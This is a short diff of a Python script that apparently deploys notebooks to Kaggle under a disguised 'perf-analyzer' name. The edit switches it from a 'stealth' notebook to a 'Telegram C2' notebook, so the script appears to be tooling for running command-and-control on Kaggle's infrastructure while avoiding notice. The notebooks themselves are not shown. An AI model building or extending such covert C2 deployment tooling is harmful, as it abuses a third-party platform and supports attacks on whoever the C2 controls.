@@ -42,8 +42,8 @@ if USERNAME == 'YOUR_KAGGLE_USERNAME' or API_KEY == 'YOUR_KAGGLE_API_KEY':
 # Unique slug with random suffix to avoid 409 conflict
 slug = f'{USERNAME}/perf-analyzer-{int(time.time())}-{random.randint(1000,9999)}'
 
-# Load notebook from same directory (stealth version)
-notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
+# Load notebook from same directory (Telegram C2 version)
+notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
 with open(notebook_path, "r") as f:
     notebook = json.load(f)
 
